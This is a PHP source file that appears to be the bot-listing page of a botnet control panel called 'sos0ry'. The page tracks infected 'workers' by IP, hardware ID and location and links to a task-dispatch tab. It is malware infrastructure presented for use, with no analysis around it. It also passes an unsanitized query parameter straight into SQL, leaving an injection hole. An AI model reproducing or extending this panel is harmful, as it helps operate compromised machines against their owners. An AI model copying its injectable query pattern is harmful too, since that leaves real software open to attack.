<?php
    session_start();
    if($_SESSION['auth'] != 'true'){
        header("Location: index.php");
        die();
    }
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>sos0ry</title>

    <!-- Bootstrap -->

    <link href="css/style_table.css" rel="stylesheet">
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/bootstrap-theme.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
        <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->

    <script src="js/bootstrap.js"></script>
  </head>
    <body>
        <?php
            include('config.php');
            $cf = mysql_fetch_assoc(mysql_query("SELECT `navbar` FROM `userinfo`"));
            echo "<nav class=\"navbar navbar-".$cf['navbar']."\">";
        ?>
        
            <div class="container-fluid">
                <div class="navbar-header">
                <?php
                    include('config.php');
                    $cf = mysql_fetch_assoc(mysql_query("SELECT `color` FROM `userinfo`"));
                    $nick = mysql_fetch_assoc(mysql_query("SELECT `login` FROM `userinfo`"));
                    
                    if($cf['color'] == 'Seller')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color: #06A0F9;text-shadow: #06A0F9 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Resident')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color:#8A2BE2;text-shadow: #8A2BE2 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Administrator')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color: red;text-shadow: red 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Fusked')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color: #f6f506;text-shadow: #f6f506 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Moderator')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color: #54E610;text-shadow: #54E610 1px 1px 10px;font-weight: bold;\">".$nick['login']."</a>";
                    else if($cf['color'] == 'Premium')
                        echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color:#fbbc00;text-shadow: #fbbc00 1px 1px 10px;font-weight: bold;background: url(http://darkwebs.biz/styles/stuff/images/bggold.gif);\">".$nick['login']."</a>";
                ?>
                </div>
                <ul class="nav navbar-nav">
                <li class="active"><a href="table.php">Workers</a></li>
                <li><a href="tasks.php">Tasks</a></li>
                <li><a href="settings.php">Settings</a></li>
                </ul>
            </div>
        </nav>
        <div class="container">
            <h2 style="color: white;">Worker list</h2>
            <p>You can search/add/remove tasks in "Tasks" tab</p>
            <h4 style="color: white;">Total workers: 
                <span style="color: red;">
                    <?php
                        include('config.php');
                        echo mysql_num_rows(mysql_query("SELECT * FROM `workers`"));
                    ?>
                </span>
            </h4>
            <form action="cmd.php" method="post">
                <input type="hidden" name="del" value="1">
                <input type="submit" class="btn btn-danger" value="Delete all users">
            </form>           
            <table class="table table-bordered">
                <thead>
                <tr style="background-color: #00BFFF; opacity: 0.9;">
                    <th>ID</th>
                    <th>IP</th>
                    <th>HWID</th>
                    <th>Location</th>
                    <th>Last seen</th>
                </tr>
                </thead>
                <tbody>
                    <?php
                        include('config.php');
                        $workers;
                        $p1 = 0;
                        $p2 = 0;
                        if(isset($_GET['p'])){
                            $p1 = $_GET['p'];
                            $t1 = $_GET['p'] * 10;
                            $workers = mysql_query("SELECT * FROM `workers` ORDER BY `id` DESC LIMIT $t1, 10");
                        }
                        else{
                            $workers = mysql_query("SELECT * FROM `workers`ORDER BY `id` DESC LIMIT 10");
                        }
                        
                        for ($i = 0; $i < mysql_num_rows($workers); $i++){
                            $curr = mysql_fetch_assoc($workers);

                            echo
                            "
                            <tr style=\"background-color: #D2691E; opacity: 0.9;\">
                            <td>".$curr['id']."</td>
                            <td>".$curr['ip']."</td>
                            <td>".$curr['hwid']."</td>
                            <td>".$curr['location']."</td>
                            <td>".$curr['seen']."</td>
                            </tr>
                            ";
                        }
                        if(mysql_num_rows(mysql_query("SELECT * FROM `workers`")) > 10){
                            $p11 = $p1 - 1;
                            $p1 += 1;
                            echo
                            "
                            <ul class=\"pager\">
                                <li><a href=\"?p=$p11\">Previous</a></li>
                                <li><a href=\"?p=$p1\">Next</a></li>
                            </ul>
                            ";
                        }

                    ?>
                </tbody>
            </table>
        </div>

        <?php
            include('config.php');
            $cf = mysql_fetch_assoc(mysql_query("SELECT `navbar` FROM `userinfo`"));
            echo "<nav class=\"navbar navbar-".$cf['navbar']." navbar-fixed-bottom\" style='opacity: 0.7'>";
        ?>
        
            <div class="container-fluid">
                <div class="navbar-header">
               <a class="navbar-brand">sos0ry</a>
                </div>
                
            </div>
        </nav>
    </body>
</html>